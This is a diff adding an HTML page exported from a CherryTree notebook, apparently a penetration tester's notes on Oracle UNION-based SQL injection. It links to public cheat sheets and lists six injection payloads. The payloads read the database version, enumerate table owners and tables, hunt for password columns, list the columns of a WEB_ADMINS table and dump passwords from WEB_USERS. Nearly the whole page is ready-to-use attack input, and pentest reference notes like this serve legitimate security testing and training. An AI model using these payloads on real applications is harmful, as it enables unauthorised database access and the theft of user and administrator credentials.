@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>oracle (Union)</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>oracle (Union)</h1><br/><a href="https://blog.yekki.co.uk/sql-injection/">https://blog.yekki.co.uk/sql-injection/</a><br /><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md</a><br /><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet">http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet</a><br /><br />a&#39; UNION SELECT banner, NULL, NULL FROM v$version--<br />a&#39; UNION SELECT DISTINCT owner, NULL, NULL FROM all_tables--<br />a&#39; UNION SELECT table_name, NULL, NULL FROM all_tables--<br />a&#39; UNION SELECT owner, table_name, NULL FROM all_tab_columns WHERE column_name LIKE &#39;%PASS%&#39;--<br />a&#39; UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name = ‘WEB_ADMINS’--<br />a&#39; UNION SELECT PASSWORD,NULL,NULL FROM WEB_USERS--</div></body></html>
